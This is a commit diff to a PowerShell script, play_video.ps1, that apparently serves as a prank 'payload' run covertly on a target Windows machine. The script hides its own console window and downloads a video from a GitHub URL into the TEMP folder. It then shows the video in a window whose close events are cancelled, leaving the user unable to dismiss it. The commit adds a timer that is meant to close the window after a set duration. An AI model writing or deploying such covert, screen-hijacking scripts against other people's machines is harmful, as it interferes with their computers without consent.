4304e414d61e1e94a0e2e616bf6a657bf2d933c9
ymkeee <forfunpaychilled@gmail.com>
2026-03-17 22:05:32 +0300

    Update play_video.ps1

--- play_video.ps1
+++ play_video.ps1
@@ -1,14 +1,17 @@
 try {
     $c = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
     $t = Add-Type -MemberDefinition $c -Name "W" -Namespace "Win" -PassThru
-    $t::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0)
+    $t::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0) | Out-Null
 } catch {}
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase
 
+# --- НАСТРОЙКИ ---
 $u = 'https://github.com/ymkeee/T-Embed/raw/refs/heads/main/edit.mp4'
 $f = "$env:TEMP\payload_video.mp4"
+$videoDuration = 15  # ВПИШИ СЮДА ДЛИТЕЛЬНОСТЬ ВИДЕО В СЕКУНДАХ (например, 15)
+# -----------------
 
 try {
     Invoke-WebRequest -Uri $u -OutFile $f -ErrorAction Stop
@@ -24,7 +27,16 @@ try {
     $reader = New-Object System.Xml.XmlNodeReader ([xml]$xaml)
     $w = [Windows.Markup.XamlReader]::Load($reader)
     $v = $w.FindName("v")
+
+    # Метод 1: Закрытие по событию (если сработает)
     $v.add_MediaEnded({ $w.Close() })
+    
+    # Метод 2: Закрытие по таймеру (гарантированное)
+    $timer = New-Object System.Windows.Threading.DispatcherTimer
+    $timer.Interval = [TimeSpan]::FromSeconds($videoDuration)
+    $timer.Add_Tick({ $w.Close(); $timer.Stop() })
+    $timer.Start()
+
     $w.Add_Closing({ $_.Cancel = $true })
     $w.ShowDialog() | Out-Null
 } 
